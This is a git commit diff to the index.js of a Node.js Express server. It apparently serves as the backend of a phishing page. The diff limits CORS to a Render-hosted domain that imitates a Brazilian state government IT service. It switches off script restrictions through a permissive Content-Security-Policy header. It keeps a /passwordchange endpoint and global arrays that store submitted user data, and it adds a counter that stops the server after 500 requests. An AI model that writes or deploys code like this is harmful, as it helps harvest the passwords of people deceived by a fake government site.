56ce5e545004aa3e7b0ac485079c3ec68a3a38c1
contatobernardobarros-cloud <contato.bernardobarros@gmail.com>
2025-10-25 14:37:34 -0300

    Add files via upload

--- index.js
+++ index.js
@@ -4,32 +4,21 @@ const cors = require("cors");
 const { connect } = require("http2");
 const app = express();
 const path = require("path");
-const port = process.env.PORT || 5000;
+const port = 80;
 
 app.use(cors({
-  origin: "*",
+  origin: "https://ssc-prodemge-gov-br.onrender.com:443",
 }));
+
+
 
 app.use(express.json());
 
-// Variável para contar as requisições
-let contador = 0;
-
-// Middleware para incrementar o contador
 app.use((req, res, next) => {
-  contador++;
-  console.log(contador);
-
-  if (contador >= 500) {
-    console.log("Treshold atingido");
-    process.exit();
-  }
-
+  res.setHeader("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;");
   next();
 });
 
-// Serve arquivos estáticos da pasta "public"
-app.use(express.static(path.join(__dirname, "public")));
 
 // Variáveis globais para salvar os usuários
 let usuariojener = [];
@@ -74,8 +63,25 @@ app.post("/passwordchange", (req, res) => {
 
   res.status(200).json({ sucesso: true, recebido: dado });
 });
+// Variável para contar as requisições
+let contador = 0;
+
+// Middleware para incrementar o contador
+app.use((req, res, next) => {
+  contador++;
+  console.log(contador);
+
+  if (contador >= 500) {
+    console.log("Treshold atingido");
+    process.exit();
+  }
+
+  next(); // Continua o fluxo
+});
+// Serve arquivos estáticos da pasta "public"
+app.use(express.static(path.join(__dirname, "public")));
 
 // Start the server
-app.listen(port, "0.0.0.0", () => {
-  console.log(`Server listening at http://0.0.0.0:${port}`);
+app.listen(port, () => {
+  console.log(`Server listening at http://localhost:${port}`);
 });
